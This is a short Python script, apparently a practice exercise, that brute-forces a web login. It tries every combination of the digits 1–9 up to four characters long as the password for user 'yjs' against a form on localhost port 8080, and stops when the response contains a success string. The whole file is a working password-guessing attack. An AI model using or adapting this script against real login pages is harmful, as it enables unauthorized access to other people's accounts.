import itertools
import requests

test_str = "123456789"

for pw_length in range(1, 5) : 
    for pw in itertools.product(test_str, repeat=pw_length) : #product = for와 동일함
        password = (''.join(pw))
        print(password) 
        login_packet= {
            "id" : "yjs",
            'pw' : password
        }
        address = requests.post('http://127.0.0.1:8080/', data = login_packet)

        if address.text.find('succsess') > 0:
            exit()